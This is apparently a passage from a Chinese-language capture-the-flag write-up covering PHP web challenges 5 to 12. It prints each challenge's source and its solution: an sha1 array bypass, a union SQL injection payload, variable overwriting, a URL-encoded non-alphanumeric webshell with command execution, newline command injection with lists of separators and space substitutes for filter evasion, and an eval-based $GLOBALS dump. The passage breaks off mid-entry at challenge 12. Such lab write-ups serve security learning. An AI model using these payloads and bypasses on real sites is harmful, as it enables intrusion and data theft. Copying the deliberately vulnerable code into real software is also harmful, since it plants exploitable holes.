<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>sha1无法处理数组，因此可构造数组绕过,数组传入结果为NULL</p>
</blockquote>
<h1 id="challenge-6"><a href="#challenge-6" class="headerlink" title="challenge 6"></a>challenge 6</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">	<span class="variable">$conn</span> = mysql_connect(<span class="string">&quot;********&quot;</span>, <span class="string">&quot;*****&quot;</span>, <span class="string">&quot;********&quot;</span>);</span><br><span class="line">	mysql_select_db(<span class="string">&quot;challenges&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Could not select database&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pwd from interest where uname=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">	printf(<span class="string">&quot;Error: %s\n&quot;</span>, mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row[&quot;pwd&quot;];</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pwd]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pwd]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>联合查询注入漏洞,构造 username=-1’union select”md5(123)”#&amp;pass=123</p>
</blockquote>
<h1 id="challenge-7"><a href="#challenge-7" class="headerlink" title="challenge 7"></a>challenge 7</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$_403</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line"><span class="variable">$_200</span> = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)  <span class="comment"># 要为POST</span></span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;BugsBunnyCTF is here :p...&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$_200</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<blockquote>
<p>可在flag被修改之前，先将flag覆盖<br>程序执行顺序foreach ($_GET as $key =&gt; $value) 比  foreach ($_POST as $key =&gt; $value)先执行，因此可利用foreach ($_GET as $key =&gt; $value) 将flag覆盖</p>
</blockquote>
<blockquote>
<p>$$key = $$value 看到这个，想到变量覆盖</p>
</blockquote>
<h1 id="challenge-8"><a href="#challenge-8" class="headerlink" title="challenge 8"></a>challenge 8</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"><span class="comment">#需要GET一个变量c</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span>(<span class="params"> <span class="variable">$length</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$size</span> = strlen( <span class="variable">$chars</span> );</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="variable">$str</span> .= <span class="variable">$chars</span>[ rand( <span class="number">0</span>, <span class="variable">$size</span> - <span class="number">1</span> ) ];</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#生成$length长度的随机字符串</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#变量c不能含有$black_list数组中的元素</span></span><br><span class="line"><span class="variable">$filename</span>=rand_string(<span class="number">0x20</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="variable">$folder</span>=<span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$full_filename</span> = <span class="variable">$folder</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="variable">$full_filename</span>, <span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span>.<span class="variable">$full_filename</span>.<span class="string">&quot;&#x27;&gt;WebShell&lt;/a&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Enjoy your webshell~&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Some thing wrong...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>




<blockquote>
<p>这题考察的是构造无字母数字Webshell，有点晕，附文章先学习一波</p>
<p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a></p>
</blockquote>
<blockquote>
<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code><br>system()—执行shell命令也就是向dos发送一条指令<br>cat命令可以用来查看文件内容<br><?php  $a=array(); echo $a;?> #Array<br><?php  $a=array(); $b=array(); echo $a.$b;?>  #ArrayArray<br><?php  $a=array(); $b="asd"; echo $a.$b;?>  #Arrayasd</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].[];</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// E</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// GE</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// GET</span></span><br><span class="line">var_dump($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[_]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[__])); <span class="comment">// $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">c</span><span class="operator">=</span><span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%5</span>b<span class="variable">%5</span>d.<span class="variable">%5</span>b<span class="variable">%5</span>d<span class="variable">%3</span>b<span class="variable">%24</span>__<span class="variable">%3</span>d<span class="variable">%27</span><span class="variable">%27</span><span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%24</span>_<span class="variable">%5</span>b<span class="variable">%27</span><span class="variable">%27</span><span class="variable">%5</span>d<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>__.<span class="variable">%3</span>d<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>__<span class="variable">%3</span>d<span class="variable">%24</span>_.<span class="variable">%24</span>__<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>__.<span class="variable">%3</span>d<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span><span class="variable">%7</span>b<span class="variable">%27</span>_<span class="variable">%27</span>.<span class="variable">%24</span>__<span class="variable">%7</span>d<span class="variable">%5</span>b_<span class="variable">%5</span>d(<span class="variable">%24</span><span class="variable">%7</span>b<span class="variable">%27</span>_<span class="variable">%27</span>.<span class="variable">%24</span>__<span class="variable">%7</span>d<span class="variable">%5</span>b__<span class="variable">%5</span>d)<span class="variable">%3</span>b</span><br></pre></td></tr></table></figure>
<p>写入full_filename，成功上传webshell，命令执行<code>?_=system&amp;__=cat%20../flag.php</code></p>
<p>即<code>system(cat%20../flag.php)</code></p>
<h1 id="challenge-9"><a href="#challenge-9" class="headerlink" title="challenge 9"></a>challenge 9</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ])) &#123;</span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;|&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$target</span>;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到基本上的命令分隔符都被过滤了，可以可以换行（%0a）绕过</p>
<blockquote>
<p>多条命令设置在同一个快捷键时，需要注意命令分隔符的使用</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">Payload: ?<span class="attribute">ip</span>=127.0.0.1%0als</span><br></pre></td></tr></table></figure>

<p>cat命令可以用来查看文件内容<code>?ip=127.0.0.1%0acat flag.php</code></p>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
</blockquote>
<p>命令分隔符</p>
<blockquote>
<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
</blockquote>
<p>空格可以用以下字符串代替</p>
<blockquote>
<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
</blockquote>
<h1 id="challenge-10"><a href="#challenge-10" class="headerlink" title="challenge 10"></a>challenge 10</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;answer&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$number</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;answer&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (noother_says_correct(<span class="variable">$number</span>))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;  <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$one</span> = ord(<span class="string">&#x27;1&#x27;</span>);  <span class="comment">#ord() 函数:返回字符串的首个字符的 ASCII 值</span></span><br><span class="line">    <span class="variable">$nine</span> = ord(<span class="string">&#x27;9&#x27;</span>); </span><br><span class="line">    <span class="comment"># Check all the input characters! </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment"># Disallow all the digits! </span></span><br><span class="line">        <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;); </span><br><span class="line">        <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) ) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="comment"># Aha, digit not allowed! </span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">#要求传入的每一个值都不能大于等于1小于等于9</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment"># Allow the magic number ... </span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&quot;3735929054&quot;</span>; <span class="comment">#弱类型比较</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要POST一个不含1-9数字的，且与<code>3735929054</code>等值的字符串</p>
<blockquote>
<p>十六进制弱类型比较</p>
<p>十六进制：(0x)deadc0de</p>
<p>八进制：0+</p>
</blockquote>
<h1 id="challenge-11"><a href="#challenge-11" class="headerlink" title="challenge 11"></a>challenge 11</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w*$/&#x27;</span>,<span class="variable">$a</span> ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;<span class="comment"># 输入的必须为数字或字母</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>var_dump($$a)中存在$$a，可以输出对应的变量值,即flag,但前提是需要知道flag的变量名，可利用$GLOBALS，<a href="https://www.cnblogs.com/NPFS/p/12721175.html">https://www.cnblogs.com/NPFS/p/12721175.html</a></p>
</blockquote>
<h1 id="challenge-12"><a href="#challenge-12" class="headerlink" title="challenge 12"></a>challenge 12</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>做法类似challenge 4</p>
<blockquote>
